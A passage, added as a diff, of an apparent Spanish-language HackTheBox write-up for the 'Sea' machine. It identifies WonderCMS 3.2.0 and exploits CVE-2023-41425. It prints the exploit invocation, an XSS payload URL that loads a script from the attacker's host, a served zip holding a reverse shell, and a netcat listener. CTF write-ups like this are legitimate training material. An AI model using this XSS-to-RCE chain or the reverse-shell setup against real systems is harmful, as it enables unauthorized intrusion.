@@ -149,3 +149,47 @@ ID           Response   Lines    Word       Chars       Payload
 000003295:   200        21 L     168 W      1067 Ch     "LICENSE"   
 ```
 
+El directorio "http://sea.htb/themes/bike/version" muestra la versión "3.2.0" de un sistema.
+
+El directorio "http://sea.htb/themes/bike/LICENSE" muestra la MIT License de "turboblack".
+
+Una busqueda de "turboblack" y el theme "bike", devuelve el CMS ["Wonder"](https://github.com/turboblack/wondercms_theme).
+
+Buscando por vulnerabilidades para Wonder CMS en versión 3.2.0 devuelve el [CVE-2023-41425](https://github.com/insomnia-jacob/CVE-2023-41425).
+
+
+## Explotación
+
+El exploit utiliza XSS para lanzar una RCE. Al ejecutar el exploit, este genera un servidor web que se queda a la escucha del puerto 8000 y entregará a la maquina victima el fichero "main.zip" que contiene la reverse shell.
+
+En los parametros del exploit se pasa el puerto donde se dejará a la escucha netcat (443):
+
+```bash
+./exploit.py -u http://sea.htb/loginURL -i 10.10.14.160 -p 443 -r http://10.10.14.160:8000/main.zip
+ 
+================================================================
+        # Autor      : Insomnia (Jacob S.)
+        # IG         : insomnia.py
+        # X          : @insomniadev_
+        # Github     : https://github.com/insomnia-jacob
+================================================================          
+ 
+[+]The zip file will be downloaded from the host:    http://10.10.14.160:8000/main.zip
+ 
+[+] File created:  xss.js
+ 
+[+] Set up nc to listen on your terminal for the reverse shell
+	Use:
+		  nc -nvlp 443 
+ 
+[+] Send the below link to admin:
+
+	http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.160:8000/xss.js"></script><form+action=" 
+
+Starting HTTP server with Python3, waiting for the XSS request
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+El exploit genera una URL que se introducirá en el campo "Website" de la página de [contacto](http://sea.htb/contact.php).
+
+Tras el submit, se obtiene acceso a la maquina con el usuario www-data.
